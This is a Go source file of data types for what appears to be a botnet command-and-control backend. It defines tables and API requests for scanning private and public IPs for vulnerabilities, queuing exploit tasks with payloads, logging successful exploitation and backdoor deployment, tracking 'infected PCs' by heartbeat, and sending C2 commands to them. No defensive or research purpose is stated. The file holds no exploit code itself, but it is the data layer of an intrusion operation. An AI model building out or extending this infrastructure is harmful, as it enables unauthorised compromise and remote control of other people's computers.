package main

// PrivateIPScan matches the private_ip_scans table
type PrivateIPScan struct {
	ID                   int     `json:"id"`
	ScanID               string  `json:"scan_id"`
	CreatedAt            string  `json:"created_at"`
	TargetIP             string  `json:"target_ip"`
	MACAddress           *string `json:"mac_address"`
	Hostname             *string `json:"hostname"`
	OpenPorts            *string `json:"open_ports"`             // JSON array
	DetectedServices     *string `json:"detected_services"`      // JSON array
	VulnerabilitiesFound *string `json:"vulnerabilities_found"`  // JSON array
	NetworkSSID          *string `json:"network_ssid"`
	NetworkBSSID         *string `json:"network_bssid"`
	RiskLevel            *string `json:"risk_level"`
	ScanSource           *string `json:"scan_source"`
}

// PublicIPScan matches the public_ip_scans table
type PublicIPScan struct {
	ID                   int     `json:"id"`
	ScanID               string  `json:"scan_id"`
	CreatedAt            string  `json:"created_at"`
	TargetIP             string  `json:"target_ip"`
	CountryCode          *string `json:"country_code"`
	City                 *string `json:"city"`
	OpenPorts            *string `json:"open_ports"`
	DetectedServices     *string `json:"detected_services"`
	VulnerabilitiesFound *string `json:"vulnerabilities_found"`
	RiskLevel            *string `json:"risk_level"`
	ScanBatchID          *string `json:"scan_batch_id"`
}

// InfectedPC matches the infected_pcs table
type InfectedPC struct {
	ID               int     `json:"id"`
	PCID             string  `json:"pc_id"`
	CreatedAt        string  `json:"created_at"`
	Hostname         *string `json:"hostname"`
	Username         *string `json:"username"`
	InternalIP       *string `json:"internal_ip"`
	ExternalIP       *string `json:"external_ip"`
	OperatingSystem  *string `json:"operating_system"`
	Architecture     *string `json:"architecture"`
	BackdoorVersion  *string `json:"backdoor_version"`
	LastHeartbeat    *string `json:"last_heartbeat"`
	Status           *string `json:"status"`
	DeploymentMethod *string `json:"deployment_method"`
	Notes            *string `json:"notes"`
}

// Task matches the task_queue table
type Task struct {
	ID              int     `json:"id"`
	TaskID          string  `json:"task_id"`
	CreatedAt       string  `json:"created_at"`
	TaskType        string  `json:"task_type"`
	TargetIP        *string `json:"target_ip"`
	VulnerabilityID *string `json:"vulnerability_id"`
	Payload         *string `json:"payload"`
	Status          string  `json:"status"`
	AssignedTo      *string `json:"assigned_to"`
	Result          *string `json:"result"`
	ErrorMessage    *string `json:"error_message"`
	CompletedAt     *string `json:"completed_at"`
}

// ExploitationLog matches the exploitation_logs table
type ExploitationLog struct {
	ID               int     `json:"id"`
	CreatedAt        string  `json:"created_at"`
	TaskID           *string `json:"task_id"`
	TargetIP         string  `json:"target_ip"`
	VulnerabilityID  *string `json:"vulnerability_id"`
	ExploitMethod    *string `json:"exploit_method"`
	Success          int     `json:"success"`
	BackdoorDeployed int     `json:"backdoor_deployed"`
	PCID             *string `json:"pc_id"`
	Details          *string `json:"details"`
	ErrorMessage     *string `json:"error_message"`
}

// C2CommandLog matches the c2_command_logs table
type C2CommandLog struct {
	ID          int     `json:"id"`
	CreatedAt   string  `json:"created_at"`
	PCID        string  `json:"pc_id"`
	CommandType string  `json:"command_type"`
	CommandData *string `json:"command_data"`
	Status      *string `json:"status"`
	Result      *string `json:"result"`
	CompletedAt *string `json:"completed_at"`
}

// --- Request/Response types ---

type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type LoginResponse struct {
	Token string `json:"token"`
}

type CreatePrivateScanRequest struct {
	TargetIP             string  `json:"target_ip"`
	MACAddress           *string `json:"mac_address"`
	Hostname             *string `json:"hostname"`
	OpenPorts            *string `json:"open_ports"`
	DetectedServices     *string `json:"detected_services"`
	VulnerabilitiesFound *string `json:"vulnerabilities_found"`
	NetworkSSID          *string `json:"network_ssid"`
	NetworkBSSID         *string `json:"network_bssid"`
	RiskLevel            *string `json:"risk_level"`
	ScanSource           *string `json:"scan_source"`
}

type CreatePublicScanRequest struct {
	TargetIP             string  `json:"target_ip"`
	CountryCode          *string `json:"country_code"`
	City                 *string `json:"city"`
	OpenPorts            *string `json:"open_ports"`
	DetectedServices     *string `json:"detected_services"`
	VulnerabilitiesFound *string `json:"vulnerabilities_found"`
	RiskLevel            *string `json:"risk_level"`
	ScanBatchID          *string `json:"scan_batch_id"`
}

type CreateTaskRequest struct {
	TaskType        string  `json:"task_type"`
	TargetIP        *string `json:"target_ip"`
	VulnerabilityID *string `json:"vulnerability_id"`
	Payload         *string `json:"payload"`
	AssignedTo      *string `json:"assigned_to"`
}

type UpdateTaskRequest struct {
	Status       *string `json:"status"`
	Result       *string `json:"result"`
	ErrorMessage *string `json:"error_message"`
}

type HeartbeatRequest struct {
	PCID            string  `json:"pc_id"`
	Hostname        *string `json:"hostname"`
	Username        *string `json:"username"`
	InternalIP      *string `json:"internal_ip"`
	ExternalIP      *string `json:"external_ip"`
	OperatingSystem *string `json:"operating_system"`
	Architecture    *string `json:"architecture"`
	BackdoorVersion *string `json:"backdoor_version"`
	DeploymentMethod *string `json:"deployment_method"`
}

type SendCommandRequest struct {
	CommandType string  `json:"command_type"`
	CommandData *string `json:"command_data"`
}

type CommandResultRequest struct {
	Status *string `json:"status"`
	Result *string `json:"result"`
}

type UpdateInfectedPCRequest struct {
	Status *string `json:"status"`
	Notes  *string `json:"notes"`
}

type ErrorResponse struct {
	Error string `json:"error"`
}

type APIResponse struct {
	Success bool        `json:"success"`
	Data    interface{} `json:"data,omitempty"`
	Message string      `json:"message,omitempty"`
}
